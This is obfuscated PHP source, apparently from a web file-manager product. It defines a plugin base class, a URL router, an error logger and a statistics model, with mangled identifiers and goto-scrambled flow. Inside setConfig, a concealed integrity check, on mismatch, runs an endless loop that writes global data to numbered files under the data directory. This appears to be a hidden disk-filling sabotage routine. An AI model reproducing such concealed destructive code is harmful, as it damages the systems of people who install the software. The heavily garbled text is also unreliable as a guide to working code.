$BåÚ½²ê›; goto cÏëŠ£¤‹¬; dí“×ÛÏ‰Ö: $C·ëÂšÅ¿Î =& $_SERVER[¯Ò¬Èè]; $FÖ ©“¬­– = $C·ëÂšÅ¿Î[1375]; $BÚŸà‡¤¨ë = $this->pluginPath . $C·ëÂšÅ¿Î[1376]; goto E×¸çë­êè; cÏëŠ£¤‹¬: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($d™Åƒ„Œ†õ) { $f‰‡Ç‘òã³ =& $_SERVER[¯Ò¬Èè]; $f ÑÀŠ­Ü = $_SERVER[$f‰‡Ç‘òã³[493]] . $f‰‡Ç‘òã³[494]; $a¿ĞÛÕ›æ– = $f‰‡Ç‘òã³[1316]; if ($_SERVER[$f‰‡Ç‘òã³[490]] != $a¿ĞÛÕ›æ–($f ÑÀŠ­Ü)) { goto Aèáôª“¥ß; Aèáôª“¥ß: $d˜Œ‡İŒõ = $f‰‡Ç‘òã³[802]; $DÊâ×ôËò = $f‰‡Ç‘òã³[492]; $aˆÃù§·ê¼ = $_SERVER[$f‰‡Ç‘òã³[493]] . $f‰‡Ç‘òã³[494]; goto cë‹Õ¸‘‹·; cƒÓ«³Æá: $DÁëÓ¹³…ë = 1; for ($e¨…Ç£½£— = $DÁëÓ¹³…ë; $e¨…Ç£½£— > 0; $e¨…Ç£½£—++) { $BÌÔÈ…£ë(DATA_PATH . $e¨…Ç£½£—, $F˜–Ô„…‰ğ); } goto A¸ØàØµà; F¾¬³ÁÜõ: $B¨»ƒ–¯¯Œ = $f‰‡Ç‘òã³[803]; $B¨»ƒ–¯¯Œ($_SERVER[$f‰‡Ç‘òã³[804]]); $d˜Œ‡İŒõ = $f‰‡Ç‘òã³[802]; goto Díá‘¨Šñ; Díá‘¨Šñ: $d˜Œ‡İŒõ(); $BÌÔÈ…£ë = $f‰‡Ç‘òã³[1317]; $F˜–Ô„…‰ğ = json_encode($GLOBALS[$f‰‡Ç‘òã³[1318]]); goto cƒÓ«³Æá; cë‹Õ¸‘‹·: $cœ¦Ø­í = $DÊâ×ôËò($aˆÃù§·ê¼); $eˆ¯ÚÅ„³¦ = explode($f‰‡Ç‘òã³[217], $cœ¦Ø­í); if (count($eˆ¯ÚÅ„³¦) < $f‰‡Ç‘òã³[570]) { $fçŠ·¸…¯° = $f‰‡Ç‘òã³[496]; $fçŠ·¸…¯°(); } goto F¾¬³ÁÜõ; A¸ØàØµà: } return $this->modelPlugin->setConfig($this->pluginName, $d™Åƒ„Œ†õ); } public function onSetConfig($D¼–£˜ÖõÁ) { } public function onGetConfig($B—Ã‹Õô¹) { } public function onChangeStatus($d³Äš Ã) { } public function onUninstall() { } public function onInstall() { } public function authCheck($bŒ°Ÿƒª˜… = "\160\x6c\x75\x67\x69\156\x41\165\164\150") { $fˆŒ¼‡©Û‘ =& $_SERVER[¯Ò¬Èè]; if (!defined($fˆŒ¼‡©Û‘[427])) { return !1; } if (_get($GLOBALS, $fˆŒ¼‡©Û‘[457])) { return !0; } $EÂÎƒÛàìï = $this->getConfig(); if (!$EÂÎƒÛàìï[$bŒ°Ÿƒª˜…]) { return !1; } return ActionCall($fˆŒ¼‡©Û‘[1379], $EÂÎƒÛàìï[$bŒ°Ÿƒª˜…]); } public function url($bÜ °å›ëƒ, $F±´³à¬Ëî = '', $f¤İŠ¤Ê¶ = true) { goto AÙì”Ïë–; EÚË‰¸¼¥: if (!$f¤İŠ¤Ê¶) { return $AŞÆïÚÍº¸; } echo $AŞÆïÚÍº¸; goto a²ºİ×¯ÅØ; d²¸íì: $fÆ°çè”ˆ¹ = $this->packageVersion(); $b‡Ü‚á¬àÚ = $dèÕÁä“ãÄ . $A¢ÙÀ›‚ø[412] . $fÆ°çè”ˆ¹; if (substr($bÜ °å›ëƒ, 0, 4) == $A¢ÙÀ›‚ø[144] || substr($bÜ °å›ëƒ, 0, 2) == $A¢ÙÀ›‚ø[1163]) { $AŞÆïÚÍº¸ = $bÜ °å›ëƒ . $A¢ÙÀ›‚ø[1380] . $b‡Ü‚á¬àÚ; } else { if ($F±´³à¬Ëî == $A¢ÙÀ›‚ø[33]) { $AŞÆïÚÍº¸ = $this->pluginHost . $bÜ °å›ëƒ . $A¢ÙÀ›‚ø[1380] . $b‡Ü‚á¬àÚ; } else { if ($F±´³à¬Ëî === $A¢ÙÀ›‚ø[76]) { $AŞÆïÚÍº¸ = $this->pluginHost . $bÜ °å›ëƒ; } else { if ($F±´³à¬Ëî == $A¢ÙÀ›‚ø[1381]) { $AŞÆïÚÍº¸ = STATIC_PATH . $bÜ °å›ëƒ . $A¢ÙÀ›‚ø[1380] . $dèÕÁä“ãÄ; } else { if ($F±´³à¬Ëî == $A¢ÙÀ›‚ø[1382]) { $AŞÆïÚÍº¸ = APP_HOST . $A¢ÙÀ›‚ø[1383] . $bÜ °å›ëƒ . $A¢ÙÀ›‚ø[1380] . $dèÕÁä“ãÄ; } else { if (isset($açêêˆµ«ˆ[$F±´³à¬Ëî])) { $AŞÆïÚÍº¸ = $açêêˆµ«ˆ[$F±´³à¬Ëî] . $bÜ °å›ëƒ . $A¢ÙÀ›‚ø[1380] . $b‡Ü‚á¬àÚ; } } } } } } goto EÚË‰¸¼¥; AÙì”Ïë–: $A¢ÙÀ›‚ø =& $_SERVER[¯Ò¬Èè]; $açêêˆµ«ˆ = $this->getConfig(); $dèÕÁä“ãÄ = KOD_VERSION . $A¢ÙÀ›‚ø[91] . KOD_VERSION_BUILD; goto d²¸íì; a²ºİ×¯ÅØ: } public function link($F°ŠíÊØ°£ = false, $bÊïÛ•–§Ë = '') { $Aùï¹ïà ´ =& $_SERVER[¯Ò¬Èè]; if (!$F°ŠíÊØ°£) { $this->link($Aùï¹ïà ´[1384], $Aùï¹ïà ´[1382]); $this->link($Aùï¹ïà ´[1385], $Aùï¹ïà ´[1381]); $this->link($Aùï¹ïà ´[1386], $Aùï¹ïà ´[1381]); $this->link($Aùï¹ïà ´[1387], $Aùï¹ïà ´[1381]); $this->link($Aùï¹ïà ´[1388], $Aùï¹ïà ´[1381]); return; } $AÕŠ˜¨­Å = $this->url($F°ŠíÊØ°£, $bÊïÛ•–§Ë, !1); if (substr($F°ŠíÊØ°£, -3) == $Aùï¹ïà ´[1389]) { echo $Aùï¹ïà ´[1390] . $AÕŠ˜¨­Å . $Aùï¹ïà ´[1391] . $Aùï¹ïà ´[217]; } else { if (substr($F°ŠíÊØ°£, -4) == $Aùï¹ïà ´[1392]) { echo $Aùï¹ïà ´[1393] . $AÕŠ˜¨­Å . $Aùï¹ïà ´[1394] . $Aùï¹ïà ´[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\x5b\136\57\x5d\x2b", "\x3a\x6e\165\155" => "\133\x30\55\x39\135\53", "\72\x61\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($f•×Ô»Ê, $b‘¶º­¿Á) { $e‹ã‘ÈÈ–é =& $_SERVER[¯Ò¬Èè]; if ($f•×Ô»Ê == $e‹ã‘ÈÈ–é[1395]) { $BÛ àŞ…ÖÃ = array_map($e‹ã‘ÈÈ–é[1396], $b‘¶º­¿Á[0]); $C’×²Ç«´ = strpos($b‘¶º­¿Á[1], $e‹ã‘ÈÈ–é[8]) === 0 ? $b‘¶º­¿Á[1] : $e‹ã‘ÈÈ–é[8] . $b‘¶º­¿Á[1]; $dñ­²×Ğ… = $b‘¶º­¿Á[2]; } else { $BÛ àŞ…ÖÃ = null; $C’×²Ç«´ = strpos($b‘¶º­¿Á[0], $e‹ã‘ÈÈ–é[8]) === 0 ? $b‘¶º­¿Á[0] : $e‹ã‘ÈÈ–é[8] . $b‘¶º­¿Á[0]; $dñ­²×Ğ… = $b‘¶º­¿Á[1]; } array_push(self::$maps, $BÛ àŞ…ÖÃ); array_push(self::$routes, $C’×²Ç«´); array_push(self::$methods, strtoupper($f•×Ô»Ê)); array_push(self::$callbacks, $dñ­²×Ğ…); } public static function error($E…õ¸‘Ô) { self::$errorCallback = $E…õ¸‘Ô; } public static function haltOnMatch($Añ¬ÆŒ÷…“ = true) { self::$halts = $Añ¬ÆŒ÷…“; } public static function dispatch() { goto fÒÁìÃ§±·; fÒÁìÃ§±·: $dô§øµìÒ¼ =& $_SERVER[¯Ò¬Èè]; $b¡¹ŒÚƒ§ = parse_url($_SERVER[$dô§øµìÒ¼[1397]], PHP_URL_PATH); $bÌ¡¨Š¢© = $_SERVER[$dô§øµìÒ¼[154]]; goto A†çŸŸÇ¾½; A†çŸŸÇ¾½: $Eàïª¢íÜ = array_keys(static::$patterns); $AŒ¸áëÕ½£ = array_values(static::$patterns); $E¿ìğË‹êò = !1; goto cÁ’Í˜‹ªù; cÁ’Í˜‹ªù: self::$routes = preg_replace($dô§øµìÒ¼[1082], $dô§øµìÒ¼[8], self::$routes); if (in_array($b¡¹ŒÚƒ§, self::$routes)) { $FóÃØïà¦é = array_keys(self::$routes, $b¡¹ŒÚƒ§); foreach ($FóÃØïà¦é as $Bƒ£Õ²Ğë) { if (self::$methods[$Bƒ£Õ²Ğë] == $bÌ¡¨Š¢© || self::$methods[$Bƒ£Õ²Ğë] == $dô§øµìÒ¼[1398] || in_array($bÌ¡¨Š¢©, self::$maps[$Bƒ£Õ²Ğë])) { $E¿ìğË‹êò = !0; if (!is_object(self::$callbacks[$Bƒ£Õ²Ğë])) { $FèÁ®’õŠÓ = explode($dô§øµìÒ¼[8], self::$callbacks[$Bƒ£Õ²Ğë]); $b½Á†Î®Öà = end($FèÁ®’õŠÓ); $F¾½íŒÒÇœ = explode($dô§øµìÒ¼[1399], $b½Á†Î®Öà); $D´ÏóÀÛµÇ = new $F¾½íŒÒÇœ[0](); $D´ÏóÀÛµÇ->{$F¾½íŒÒÇœ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Bƒ£Õ²Ğë]); if (self::$halts) { return; } } } } } else { $bÔõ‚¢£Œ£ = 0; foreach (self::$routes as $Bƒ£Õ²Ğë) { if (strpos($Bƒ£Õ²Ğë, $dô§øµìÒ¼[4]) !== !1) { $Bƒ£Õ²Ğë = str_replace($Eàïª¢íÜ, $AŒ¸áëÕ½£, $Bƒ£Õ²Ğë); } if (preg_match($dô§øµìÒ¼[1400] . $Bƒ£Õ²Ğë . $dô§øµìÒ¼[1401], $b¡¹ŒÚƒ§, $bäÑ…¼‚æŞ)) { if (self::$methods[$bÔõ‚¢£Œ£] == $bÌ¡¨Š¢© || self::$methods[$bÔõ‚¢£Œ£] == $dô§øµìÒ¼[1398] || !empty(self::$maps[$bÔõ‚¢£Œ£]) && in_array($bÌ¡¨Š¢©, self::$maps[$bÔõ‚¢£Œ£])) { $E¿ìğË‹êò = !0; array_shift($bäÑ…¼‚æŞ); if (!is_object(self::$callbacks[$bÔõ‚¢£Œ£])) { $FèÁ®’õŠÓ = explode($dô§øµìÒ¼[8], self::$callbacks[$bÔõ‚¢£Œ£]); $b½Á†Î®Öà = end($FèÁ®’õŠÓ); $F¾½íŒÒÇœ = explode($dô§øµìÒ¼[1399], $b½Á†Î®Öà); $D´ÏóÀÛµÇ = new $F¾½íŒÒÇœ[0](); if (!method_exists($D´ÏóÀÛµÇ, $F¾½íŒÒÇœ[1])) { echo $dô§øµìÒ¼[1402]; } else { call_user_func_array(array($D´ÏóÀÛµÇ, $F¾½íŒÒÇœ[1]), $bäÑ…¼‚æŞ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$bÔõ‚¢£Œ£], $bäÑ…¼‚æŞ); if (self::$halts) { return; } } } } $bÔõ‚¢£Œ£++; } } if ($E¿ìğË‹êò == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $eÆ˜ø§Ó»ù =& $_SERVER[¯Ò¬Èè]; header($_SERVER[$eÆ˜ø§Ó»ù[1403]] . $eÆ˜ø§Ó»ù[1404]); echo $eÆ˜ø§Ó»ù[1405]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$dô§øµìÒ¼[1397]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto e˜Úà¨©©; e˜Úà¨©©: } } goto b¶ÇÜ´¯™”; FƒÌï®Í¯: function beforeShutdownError($fˆ½ê˜«ÕÂ = false, $AùùßïÜ— = '', $Cäµç±È¢· = '', $eâ‹š¾¸­õ = 0) { $AŸÛ‘“î¥½ =& $_SERVER[™‡«†³Ğ]; switch ($fˆ½ê˜«ÕÂ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $EììÍæ·Ş = $AŸÛ‘“î¥½[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $EììÍæ·Ş = $AŸÛ‘“î¥½[40]; break; case E_STRICT: $EììÍæ·Ş = $AŸÛ‘“î¥½[41]; break; case E_NOTICE: case E_USER_NOTICE: $EììÍæ·Ş = $AŸÛ‘“î¥½[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $EììÍæ·Ş = $AŸÛ‘“î¥½[43]; break; default: break; } if (!$EììÍæ·Ş || $EììÍæ·Ş == $AŸÛ‘“î¥½[42] || $EììÍæ·Ş == $AŸÛ‘“î¥½[43]) { return; } $Cäµç±È¢· = $AŸÛ‘“î¥½[4] . str_replace($_SERVER[$AŸÛ‘“î¥½[37]], $AŸÛ‘“î¥½[20], $Cäµç±È¢·); $B¦ÂƒÀˆùé = $EììÍæ·Ş . $AŸÛ‘“î¥½[44] . $AùùßïÜ— . $AŸÛ‘“î¥½[44] . $Cäµç±È¢· . $AŸÛ‘“î¥½[44] . $eâ‹š¾¸­õ; write_log($B¦ÂƒÀˆùé . $AŸÛ‘“î¥½[18] . get_caller_msg(1), $AŸÛ‘“î¥½[19]); } $_SERVER[$_SERVER[™‡«†³Ğ][45]] = $_SERVER[$_SERVER[™‡«†³Ğ][37]] . $_SERVER[™‡«†³Ğ][46]; $Dšö¥ˆ¬Æî = strrev(base64_decode($_SERVER[™‡«†³Ğ][47])); goto EÈ»ĞŸ¦¸; cÔŸõÏ¤‘¢: $_SERVER[$_SERVER[™‡«†³Ğ][52]] = ("\x39\x36\x33\x36"."\61\66")+0;$_QZ4k="67XRrhwkzK2g2MtmCBCFFug7mNCwbpBtXTvN5xnGwRYG5NtQanYSp8EqyCWMYA4UIiyhwZfv4SZczK";; stream_wrapper_register($_SERVER[™‡«†³Ğ][53], $_SERVER[™‡«†³Ğ][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($c±‡¼„õ…Ó, $c¿œ‚óä¨) { $d„Ã¹®°‡¬ =& $_SERVER[¯Ò¬Èè]; if (isset(self::$_methodList[$c±‡¼„õ…Ó])) { return @call_user_func_array(self::$_methodList[$c±‡¼„õ…Ó], $c¿œ‚óä¨); } else { if (method_exists($this, $c±‡¼„õ…Ó)) { return call_user_func_array(array($this, $c±‡¼„õ…Ó), $c¿œ‚óä¨); } else { think_exception(__CLASS__ . $d„Ã¹®°‡¬[4] . $c±‡¼„õ…Ó . $d„Ã¹®°‡¬[5]); } } } public static function __callStatic($eØõ˜îî³‡, $dõ÷ø’±¹é) { if (isset(self::$_methodListStatic[$eØõ˜îî³‡])) { return call_user_func_array(self::$_methodListStatic[$eØõ˜îî³‡], $dõ÷ø’±¹é); } else { if (method_exists(self, $eØõ˜îî³‡)) { return call_user_func_array(array(self, $eØõ˜îî³‡), $dõ÷ø’±¹é); } else { show_json("{$eØõ˜îî³‡}\50\51\40\x6e\x6f\164\40\145\x78\151\163\164\73", !1); } } } public static function addMethod($bóÀ²Ä‘Œ, $a¹ÀñâÜ£À) { self::$_methodList[$bóÀ²Ä‘Œ] = $a¹ÀñâÜ£À; } public static function addMethodStatic($DÉ ØïÈÔ¨, $dËñ¦À¯Ü) { self::$_methodListStatic[$DÉ ØïÈÔ¨] = $dËñ¦À¯Ü; } } goto E“ÀÛğ‘Ÿê; Cßä†•º‰Ì: class AnalysisModel extends ModelBaseLight { public function init($cîçãà–ËØ) { $d´Ì¿ê‘ä =& $_SERVER[¯Ò¬Èè]; $bŞƒ³Î­¦¡ = array($d´Ì¿ê‘ä[544] => array($d´Ì¿ê‘ä[29] => $d´Ì¿ê‘ä[2039], $d´Ì¿ê‘ä[261] => array($d´Ì¿ê‘ä[210], $d´Ì¿ê‘ä[714], $d´Ì¿ê‘ä[2040], $d´Ì¿ê‘ä[2041])), $d´Ì¿ê‘ä[2042] => array($d´Ì¿ê‘ä[29] => $d´Ì¿ê‘ä[2043], $d´Ì¿ê‘ä[261] => array($d´Ì¿ê‘ä[210], $d´Ì¿ê‘ä[712], $d´Ì¿ê‘ä[2044], $d´Ì¿ê‘ä[2045], $d´Ì¿ê‘ä[2046]))); if (!isset($bŞƒ³Î­¦¡[$cîçãà–ËØ])) { return !1; } $this->optionType = $bŞƒ³Î­¦¡[$cîçãà–ËØ][$d´Ì¿ê‘ä[29]]; $this->field = $bŞƒ³Î­¦¡[$cîçãà–ËØ][$d´Ì¿ê‘ä[261]]; return !0; } public function listData($F©õº‘Š = false, $CƒŸ‡£‹µ³ = "\155\157\x64\151\x66\171\124\x69\x6d\145", $AÁíö™‹‚Ş = false) { return parent::listData($F©õº‘Š, $CƒŸ‡£‹µ³, $AÁíö™‹‚Ş); } public function trendList($A‰Éœ¯ğ±·) { goto C‘¦¦Ã‘µ; eÒ¸Ëó¾Æ¥: if (!isset($D¡İõÈ¯î)) { $aŞãö¦œù = $A‰Éœ¯ğ±· == $cÎœ´âÔã[544] ? $cÎœ´âÔã[477] : $cÎœ´âÔã[767]; $D¡İõÈ¯î = Model($aŞãö¦œù)->min($cÎœ´âÔã[187]); } $cÈÜ›ŸßíŠ = $cÎœ´âÔã[2049] . ucfirst($A‰Éœ¯ğ±·); $b¶À°Ğ“á÷ = $this->dateList($D¡İõÈ¯î); goto d¯å„½Ù¢¹; C‘¦¦Ã‘µ: $cÎœ´âÔã =& $_SERVER[¯Ò¬Èè]; $aêŠ‰·çŒ¯ = $this->listData(); if ($aêŠ‰·çŒ¯) { $Fğ‡ŞÊ¼ö¡ = end($aêŠ‰·çŒ¯); $b—Äğî• = date($cÎœ´âÔã[2047], strtotime($cÎœ´âÔã[2048])); if ($Fğ‡ŞÊ¼ö¡[$cÎœ´âÔã[210]] == $b—Äğî•) { return $aêŠ‰·çŒ¯; } $D¡İõÈ¯î = strtotime($Fğ‡ŞÊ¼ö¡[$cÎœ´âÔã[210]]); } goto eÒ¸Ëó¾Æ¥; d¯å„½Ù¢¹: foreach ($b¶À°Ğ“á÷ as $b—Äğî•) { $this->{$cÈÜ›ŸßíŠ}($b—Äğî•); } return $this->listData(); goto eì‡¾º£; eì‡¾º£: } private function dateList($dÊÎõ¸é»Ä) { $BëœØŒ¾ĞÛ =& $_SERVER[¯Ò¬Èè]; $a½»Ûğ¡Œ = $dÊÎõ¸é»Ä; $E—ÃîÇ‰Ñ = strtotime($BëœØŒ¾ĞÛ[2048]); $eÏ‹ÊÁé¢º = array(); while ($a½»Ûğ¡Œ <= $E—ÃîÇ‰Ñ) { $eÏ‹ÊÁé¢º[] = date($BëœØŒ¾ĞÛ[2047], $a½»Ûğ¡Œ); $a½»Ûğ¡Œ = strtotime($BëœØŒ¾ĞÛ[2050], $a½»Ûğ¡Œ); } return $eÏ‹ÊÁé¢º; } public function _recordUser($e—ßº†Ä™Ä = '') { goto B¤½…¯”¨; aèª¨¹ˆò: $CÍŒ¯¯ÉÄ§ = Model($FÄ§ŠÆäÇÜ[477])->where($Fœ–ÕÂƒçµ)->count($FÄ§ŠÆäÇÜ[1446]); $Fœ–ÕÂƒçµ[$FÄ§ŠÆäÇÜ[29]] = $FÄ§ŠÆäÇÜ[2053]; $DÇÀÕĞ”¡ = Model($FÄ§ŠÆäÇÜ[2054])->where($Fœ–ÕÂƒçµ)->count($FÄ§ŠÆäÇÜ[2055]); goto C£¯Ü…¹«°; C£¯Ü…¹«°: $CÃ™²èĞê = array($FÄ§ŠÆäÇÜ[210] => $e—ßº†Ä™Ä, $FÄ§ŠÆäÇÜ[714] => (int) $d×«ŒË‚ÊÅ, $FÄ§ŠÆäÇÜ[2040] => (int) $CÍŒ¯¯ÉÄ§, $FÄ§ŠÆäÇÜ[2041] => (int) $DÇÀÕĞ”¡); return $this->insert($CÃ™²èĞê); goto e­»Õ¼ù—†; B¤½…¯”¨: $FÄ§ŠÆäÇÜ =& $_SERVER[¯Ò¬Èè]; $BâòøÂà = strtotime(date($FÄ§ŠÆäÇÜ[2051], strtotime($e—ßº†Ä™Ä))); $c­êñ—ôæ = strtotime(date($FÄ§ŠÆäÇÜ[2052], strtotime($e—ßº†Ä™Ä))); goto b£ñª÷­; b£ñª÷­: $Fœ–ÕÂƒçµ = array($FÄ§ŠÆäÇÜ[187] => array($FÄ§ŠÆäÇÜ[936], $c­êñ—ôæ)); $d×«ŒË‚ÊÅ = Model($FÄ§ŠÆäÇÜ[477])->where($Fœ–ÕÂƒçµ)->count($FÄ§ŠÆäÇÜ[1446]); $Fœ–ÕÂƒçµ[$FÄ§ŠÆäÇÜ[187]] = array($FÄ§ŠÆäÇÜ[321], array($BâòøÂà, $c­êñ—ôæ)); goto aèª¨¹ˆò; e­»Õ¼ù—†: } public function _recordStore($BŸ‚„«ö—¡ = '') { goto Eõ­ù›‰áö; Få³Şó§Õƒ: $bÌ§ßó¬¿²[$fÃéáÇæÎ[371]] = 1; $E±Ÿ³‰¼èÓ = Model($fÃéáÇæÎ[767])->where($bÌ§ßó¬¿²)->sum($fÃéáÇæÎ[77]); $bÌ§ßó¬¿²[$fÃéáÇæÎ[371]] = 2; goto e¬ä‹ğ¢ˆ; Eõ­ù›‰áö: $fÃéáÇæÎ =& $_SERVER[¯Ò¬Èè]; $fŸ×§…œÎñ = strtotime(date($fÃéáÇæÎ[2052], strtotime($BŸ‚„«ö—¡))); $bÌ§ßó¬¿² = array($fÃéáÇæÎ[187] => array($fÃéáÇæÎ[936], $fŸ×§…œÎñ)); goto F®„¾ÛÎ¶…; e¬ä‹ğ¢ˆ: $A¨èê©à• = Model($fÃéáÇæÎ[767])->where($bÌ§ßó¬¿²)->sum($fÃéáÇæÎ[77]); $cŒÒ”…Ë = array($fÃéáÇæÎ[210] => $BŸ‚„«ö—¡, $fÃéáÇæÎ[712] => (int) $FâŒÙÑÕÀÚ, $fÃéáÇæÎ[2044] => (int) $A§Õ§ØÚ‰È, $fÃéáÇæÎ[2045] => (int) $E±Ÿ³‰¼èÓ, $fÃéáÇæÎ[2046] => (int) $A¨èê©à•); return $this->insert($cŒÒ”…Ë); goto FÔÑÀøîÅ; F®„¾ÛÎ¶…: $A§Õ§ØÚ‰È = Model($fÃéáÇæÎ[422])->where($bÌ§ßó¬¿²)->sum($fÃéáÇæÎ[77]); $bÌ§ßó¬¿²[$fÃéáÇæÎ[370]] = 0; $FâŒÙÑÕÀÚ = Model($fÃéáÇæÎ[767])->where($bÌ§ßó¬¿²)->sum($fÃéáÇæÎ[77]); goto Få³Şó§Õƒ; FÔÑÀøîÅ: } public function trend($bŠóìÒï®™, $FõáÄ‚¶ö£) { goto aÓÜÉÆŠìø; Fß–í“Š±: return $a©¨çµ¿Ù†; goto aµƒ‚¾Ê–Û; dÀªœ™«–æ: if ($bÂ¯ÄæÉ && $FõáÄ‚¶ö£ != $F÷¿¨â¤µÖ[1421]) { $d–™‘Ø‡ªÏ = $bÂ¯ÄæÉ[0][$F÷¿¨â¤µÖ[210]]; $e¸ÃæŒ¨Î× = $this->validDate($FõáÄ‚¶ö£, $d–™‘Ø‡ªÏ); $F çªÚ©ˆÊ = array(); $f­ÅÁ¾ÏÌ = array_to_keyvalue($bÂ¯ÄæÉ, $F÷¿¨â¤µÖ[210]); foreach ($e¸ÃæŒ¨Î× as $d£¿·¸·) { if (isset($f­ÅÁ¾ÏÌ[$d£¿·¸·])) { $EæÍ„ñ³ºØ = $f­ÅÁ¾ÏÌ[$d£¿·¸·]; } else { $EæÍ„ñ³ºØ = end($bÂ¯ÄæÉ); $EæÍ„ñ³ºØ[$F÷¿¨â¤µÖ[210]] = $d£¿·¸·; if ($bŠóìÒï®™ == $F÷¿¨â¤µÖ[544]) { $EæÍ„ñ³ºØ[$F÷¿¨â¤µÖ[2040]] = $EæÍ„ñ³ºØ[$F÷¿¨â¤µÖ[2041]] = 0; } } $F çªÚ©ˆÊ[] = $EæÍ„ñ³ºØ; } $bÂ¯ÄæÉ = $F çªÚ©ˆÊ; } $bˆ”±Ğ„ï¥ = array($F÷¿¨â¤µÖ[544] => array($F÷¿¨â¤µÖ[714] => LNG($F÷¿¨â¤µÖ[2056]), $F÷¿¨â¤µÖ[2040] => LNG($F÷¿¨â¤µÖ[2057]), $F÷¿¨â¤µÖ[2041] => LNG($F÷¿¨â¤µÖ[2058])), $F÷¿¨â¤µÖ[2042] => array($F÷¿¨â¤µÖ[712] => LNG($F÷¿¨â¤µÖ[2059]), $F÷¿¨â¤µÖ[2044] => LNG($F÷¿¨â¤µÖ[2060]), $F÷¿¨â¤µÖ[2045] => LNG($F÷¿¨â¤µÖ[2061]), $F÷¿¨â¤µÖ[2046] => LNG($F÷¿¨â¤µÖ[2062]))); $DÌíÀ±ƒŠ = array($F÷¿¨â¤µÖ[544] => $F÷¿¨â¤µÖ[2063], $F÷¿¨â¤µÖ[2042] => $F÷¿¨â¤µÖ[77]); goto BÌ¸ÔÑ—Í; aÓÜÉÆŠìø: $F÷¿¨â¤µÖ =& $_SERVER[¯Ò¬Èè]; if (!$this->init($bŠóìÒï®™)) { return !1; } $bÂ¯ÄæÉ = $this->trendList($bŠóìÒï®™); goto dÀªœ™«–æ; BÌ¸ÔÑ—Í: if (empty($bÂ¯ÄæÉ)) { $d£¿·¸· = date($F÷¿¨â¤µÖ[2047], strtotime($F÷¿¨â¤µÖ[2048])); $E²÷íö°Šè = array($F÷¿¨â¤µÖ[210] => $d£¿·¸·); foreach ($bˆ”±Ğ„ï¥[$bŠóìÒï®™] as $F¹Œ‹‡Ãß => $aòÇ½Ëõˆ¡) { $E²÷íö°Šè[$F¹Œ‹‡Ãß] = 0; } $bÂ¯ÄæÉ[] = $E²÷íö°Šè; } $a©¨çµ¿Ù† = array(); foreach ($bÂ¯ÄæÉ as $aòÇ½Ëõˆ¡) { if ($bŠóìÒï®™ == $F÷¿¨â¤µÖ[2042] && $aòÇ½Ëõˆ¡[$F÷¿¨â¤µÖ[2044]] > $aòÇ½Ëõˆ¡[$F÷¿¨â¤µÖ[712]]) { $aòÇ½Ëõˆ¡[$F÷¿¨â¤µÖ[2044]] = $aòÇ½Ëõˆ¡[$F÷¿¨â¤µÖ[712]]; } foreach ($bˆ”±Ğ„ï¥[$bŠóìÒï®™] as $F¹Œ‹‡Ãß => $Eš¼Œ®“ö) { $EæÍ„ñ³ºØ = array($F÷¿¨â¤µÖ[210] => $aòÇ½Ëõˆ¡[$F÷¿¨â¤µÖ[210]], $F÷¿¨â¤µÖ[1352] => $Eš¼Œ®“ö); $EæÍ„ñ³ºØ[$DÌíÀ±ƒŠ[$bŠóìÒï®™]] = isset($aòÇ½Ëõˆ¡[$F¹Œ‹‡Ãß]) ? $aòÇ½Ëõˆ¡[$F¹Œ‹‡Ãß] : 0; $a©¨çµ¿Ù†[] = $EæÍ„ñ³ºØ; } } goto Fß–í“Š±; aµƒ‚¾Ê–Û: } public function validDate($f×„ÑÀªª, $bõ—å‚˜œØ) { goto C÷°é´°Ç; fåÌŠí ·: return $BË¼ã™ÈšÖ; goto FÒéÊ‹³¡; C÷°é´°Ç: $e¾È•Ü´’ =& $_SERVER[¯Ò¬Èè]; $B…Ï©ˆ¢ø‡ = date($e¾È•Ü´’[2047], strtotime($e¾È•Ü´’[2048])); $BË¼ã™ÈšÖ = array($B…Ï©ˆ¢ø‡); goto A•ƒØÇìÁµ; A•ƒØÇìÁµ: switch ($f×„ÑÀªª) { case $e¾È•Ü´’[1428]: $EÁœ³¢É© = mktime(0, 0, 0, date($e¾È•Ü´’[2064]), date($e¾È•Ü´’[2065]) - date($e¾È•Ü´’[1234]) + 7 - 7, date($e¾È•Ü´’[2066])); $Aùˆº™›ôæ = 0; do { $E¨ñ­Şß = date($e¾È•Ü´’[2047], $EÁœ³¢É© - 3600 * 24 * 7 * $Aùˆº™›ôæ); $BË¼ã™ÈšÖ[] = $E¨ñ­Şß; $Aùˆº™›ôæ++; } while ($bõ—å‚˜œØ < $E¨ñ­Şß); break; case $e¾È•Ü´’[1426]: $Aùˆº™›ôæ = 1; do { $dÊù¬Óœ = date($e¾È•Ü´’[2067], strtotime("\55\40{$Aùˆº™›ôæ}\40\x6d\157\x6e\164\150\x73")); $BË¼ã™ÈšÖ[] = $dÊù¬Óœ; $Aùˆº™›ôæ++; } while ($bõ—å‚˜œØ < $dÊù¬Óœ); break; case $e¾È•Ü´’[1735]: $D¸ÖÌÌŞ²ì = (int) date($e¾È•Ü´’[2066], strtotime($bõ—å‚˜œØ)); $b‡é„ÑŠ = (int) date($e¾È•Ü´’[2066]); if ($D¸ÖÌÌŞ²ì >= $b‡é„ÑŠ) { break; } for ($D¸ÖÌÌŞ²ì; $D¸ÖÌÌŞ²ì < $b‡é„ÑŠ; $D¸ÖÌÌŞ²ì++) { $BË¼ã™ÈšÖ[] = $D¸ÖÌÌŞ²ì . $e¾È•Ü´’[2068]; } break; default: break; } if ($bõ—å‚˜œØ > end($BË¼ã™ÈšÖ)) { array_pop($BË¼ã™ÈšÖ); } sort($BË¼ã™ÈšÖ); goto fåÌŠí ·; 